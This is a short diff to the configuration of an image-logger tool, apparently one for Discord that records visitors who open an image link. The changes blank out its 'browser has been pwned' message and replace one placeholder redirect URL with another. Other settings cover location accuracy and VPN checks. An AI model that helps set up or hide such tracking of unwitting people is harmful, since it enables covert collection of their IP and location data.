@@ -16,7 +16,7 @@ config = {
     "accurateLocation": False,
     "message": {
         "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "message": "",
         "richMessage": True,
     },
     "vpnCheck": 1,
@@ -27,6 +27,6 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False,
-        "page": "https://your-link.here"
+        "page": "redirect_url"
     },
 }
